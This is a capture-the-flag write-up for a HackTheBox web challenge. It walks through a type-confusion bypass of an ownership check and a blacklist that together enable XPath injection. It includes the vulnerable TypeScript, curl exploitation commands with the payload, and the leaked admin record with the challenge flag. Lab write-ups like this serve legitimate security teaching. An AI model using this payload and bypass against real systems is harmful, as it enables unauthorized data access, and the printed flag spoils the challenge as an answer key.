@@ -1,0 +1,142 @@
+---
+title: "HackTheBox: TreaPortal"
+date: "2026-11-04"
+description: "Exploiting dual type-confusion flaws in a Fastify app to achieve XPath injection and extract confidential data."
+difficulty: "Easy"
+category: "Web"
+tags: ["type-confusion", "xpath-injection", "auth-bypass", "nodejs", "fastify"]
+author: "Bryant"
+---
+
+# TreaPortal — HTB Web Challenge Writeup
+
+## Challenge Info
+
+- **Name:** TreaPortal
+- **Difficulty:** Easy
+- **Rating:** 4.6 / 5 (22 ratings)
+- **XP Reward:** 260
+- **Scenario:** *"We migrated to a new stack, but somehow an attacker got access to our confidential data. Can you figure out how?"*
+
+## Overview
+
+TreaPortal is a Fastify (Node.js/TypeScript) web app backed by an XML "database." The bug chain involves two separate **type-confusion** bugs stacked on top of each other, which together unlock an **XPath injection** that leaks the admin's flag. Neither bug is exploitable on its own — it's the combination that breaks the app.
+
+## Source Review
+
+The provided source exposes three route files and a service layer:
+
+- `src/routes/user.ts` — fetches a user's profile by `username` query param
+- `src/routes/dashboard.ts` — returns salary info for the logged-in user
+- `src/routes/auth.ts` — register/login, issues JWTs
+- `src/services/userService.ts` — reads/writes `users.xml` via XPath queries
+- `src/db/init.ts` — seeds the XML "database" with an `admin` user holding the flag
+
+### Bug #1 — Broken ownership check in `user.ts`
+
+```ts
+const { username } = req.query as any
+const tokenPayload = req.user as IJwtPayload
+
+// Temporarily restricted during migration.
+// TODO: reimplement with request schema validation
+if (typeof username === 'string' && username !== tokenPayload.username) {
+    return res.status(403).send({ err: 'Access denied' })
+}
+
+const user = await getUserByUsername(username)
+```
+
+The comment is the giveaway: this check was left half-finished during a migration. It only enforces "you can only look up yourself" **if `username` is a string**. Any other type for `username` skips the check entirely.
+
+Fastify's query parser turns a **repeated query key** into an array, e.g. `?username=a&username=b` → `req.query.username = ["a", "b"]`. Since `typeof ["a","b"] === 'string'` is `false`, the ownership check never runs.
+
+### Bug #2 — Blacklist filter assumes a string, in `userService.ts`
+
+```ts
+function looksLikeXPathInjection(input: string): boolean {
+    const blacklist = ["'", ';', 'or', 'and', ')', "(", "/" , "doc"];
+    return blacklist.some(pattern => input.includes(pattern));
+}
+
+export async function getUserByUsername(username: any): Promise<IUser | null> {
+    if (looksLikeXPathInjection(username)) throw new Error('bad')
+    const doc = await getDoc()
+    const node = xpath.select1(`//user[username='${username}']`, doc as any)
+    return nodeToUser(node)
+}
+```
+
+`Array.prototype.includes()` and `String.prototype.includes()` do **different things**:
+
+- On a **string**, `.includes('or')` checks for a substring.
+- On an **array**, `.includes('or')` checks whether `'or'` is an exact element of the array.
+
+Since `username` is now an array (thanks to Bug #1), none of the blacklisted tokens (`'`, `or`, `(`, etc.) ever match as *whole array elements* — so a payload like `["admin' or '1'='1", "x"]` sails straight through the filter untouched.
+
+### Bug #3 — XPath injection via template literal
+
+```ts
+const node = xpath.select1(`//user[username='${username}']`, doc as any)
+```
+
+When an array is interpolated into a template literal, JS implicitly calls `.toString()` on it, joining elements with commas. With a two-element array `["admin' or '1'='1", "x"]`, this becomes the XPath query:
+
+```
+//user[username='admin' or '1'='1,x']
+```
+
+The `or '1'='1` makes the predicate a tautology, so `xpath.select1` (which returns only the **first** matching node) returns the first `<user>` in the document — which is `admin`, seeded by `src/db/init.ts` with the flag embedded.
+
+The route then returns the full record, flag included, with no further access control:
+
+```ts
+return {
+    username: user.username,
+    email: user.email,
+    salary: user.salary,
+    role: user.role,
+    flag: user.flag
+}
+```
+
+## Exploitation Steps
+
+**1. Register an account** (required: email must end in `@trea.htb`):
+
+```bash
+curl -s -X POST http://<target-ip>:<port>/api/auth/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attacker","email":"attack@trea.htb","password":"Password123"}'
+```
+
+This returns a JWT. The token's identity doesn't matter — the vulnerable check never fires.
+
+**2. Trigger the array-type-confusion + XPath injection** by repeating the `username` query parameter:
+
+```bash
+curl -s "http://<target-ip>:<port>/api/user/?username=admin%27%20or%20%271%27=%271&username=x" \
+  -H "Authorization: Bearer <jwt-from-step-1>"
+```
+
+**3. Result:**
+
+```json
+{
+  "username": "admin",
+  "email": "admin@trea.htb",
+  "salary": 15000,
+  "role": "administrator",
+  "flag": "HTB{73fdf572b1f0eece7d3520ef478d0133}"
+}
+```
+
+## Root Cause
+
+A validation/authorization check written with the implicit assumption that a query parameter is always a `string`. Web frameworks routinely let repeated or bracketed query keys collapse into arrays or objects, and `typeof`, `.includes()`, regex `.test()`, and similar checks behave completely differently — or silently no-op — on those types. The fix is schema validation at the route boundary (e.g. Fastify's own `schema.querystring` with `type: 'string'`), not ad-hoc runtime type assumptions sprinkled through handler code.
+
+## Takeaways
+
+- Never trust that a parsed query/body value matches the type your code assumes — validate the *type itself*, not just the content.
+- A blacklist-based filter is fragile even when it works correctly on the intended input type; it silently stops working on an unintended type.
+- "Temporary" auth shortcuts left in during a migration (see: that TODO comment) are exactly the kind of thing that ships to production and gets exploited.
